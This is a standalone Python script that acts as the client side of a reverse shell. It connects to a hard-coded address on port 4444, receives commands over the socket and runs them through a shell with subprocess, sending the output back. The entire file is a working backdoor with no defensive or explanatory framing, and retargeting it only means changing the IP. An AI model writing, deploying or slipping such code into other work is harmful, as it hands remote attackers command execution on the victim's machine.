import socket
import subprocess
import os


def session_handler():
    print(f'[+] Trying to connect to {host_ip}')
    sock.connect((host_ip,host_port))
    print(f'[+] Connected to {host_ip}')

    while True:
        try:
            message = sock.recv(1024).decode()
            print(message)
            if message == 'exit':
                print('[-] The server terminated the session...')
                sock.close()
                break
            
            elif message.split(" ")[0] == 'cd': #split message on space and see if index 0 == cd
                directory = str(message.split(" ")[1])
                os.chdir(directory)
                cur_dir = os.getcwd()
                print(f'[+] Changed dir to to {cur_dir}')
                sock.send(cur_dir.encode())
            else:
                #subprocess shell handling
                command = subprocess.Popen(message, shell=True, stdout =subprocess.PIPE, stderr=subprocess.PIPE)
                output = command.stdout.read() + command.stderr.read()
                sock.send(output)            
                
        except KeyboardInterrupt:
             print(' [+] Keyboard interupt iniated...')
             sock.close()
             break
        except Exception:
            sock.close()
            break

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host_ip = '127.0.0.1'
host_port = 4444
session_handler()


